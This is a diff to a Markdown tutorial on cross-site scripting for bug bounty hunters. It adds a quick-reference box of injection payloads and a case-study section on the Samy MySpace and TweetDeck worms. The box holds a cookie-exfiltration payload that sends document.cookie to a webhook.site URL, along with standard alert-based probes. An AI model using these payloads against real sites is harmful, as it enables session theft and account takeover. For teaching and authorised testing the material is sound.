@@ -1,5 +1,16 @@
 # Cross-Site Scripting (XSS): Real-World Attack Scenarios & Bug Hunter Methodology
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. **Canary Injection:** Inject an unencoded probe string into input forms: `test"'><h1>canary777`
+> 2. **Sink Analysis:** Open DevTools (`Ctrl+U` or `F12`), search for `canary777`, and inspect which characters passed unescaped.
+> 3. **Payload Execution:**
+>    - In HTML body: `<script>alert(document.domain)</script>`
+>    - Inside attribute: `"><svg onload=alert(1)>`
+>    - Cookie exfiltration: `<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>`
+
+---
+
 Web security learners frequently ask: **"What does an XSS attack actually achieve beyond showing an `alert(1)` pop-up?"** and **"How do professional bug hunters systematically discover, verify, and report XSS findings to get them triaged and awarded bounties?"**
 
 An `alert(1)` dialog is merely a Proof of Concept proving that arbitrary JavaScript executes in the target application's context. In real-world exploitation, injected JavaScript operates with the **full authority (*Same-Origin Privileges*)** of the victim's session.
@@ -126,6 +137,14 @@ Verify if special characters were converted to HTML entities:
 * Inside `<script>` → `"-alert(document.domain)-"`
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### The Samy Worm on MySpace (2005) & TweetDeck Retweet Worm (2014)
+Definitive real-world proof that XSS is capable of collapsing global web platforms:
+* **The Samy Worm (2005):** Security researcher Samy Kamkar found a Stored XSS vulnerability on his MySpace profile. He constructed a self-propagating JavaScript payload: whenever an authenticated user viewed Samy's profile, the script forced their account to add Samy as a friend, appended *"Samy is my hero"* to their profile, and copied the malicious script into their own page.
+* **Exponential Infection:** In under **20 hours**, the worm infected over **1,000,000 users**, making it the fastest-spreading computer worm in history and forcing MySpace to take its servers offline for emergency maintenance.
+* **TweetDeck XSS (2014):** A similar self-replicating script hit TweetDeck in 2014, forcing users to automatically retweet the payload tens of thousands of times within minutes.
 
 ## 4. Official Bug Bounty Reporting Standards
 
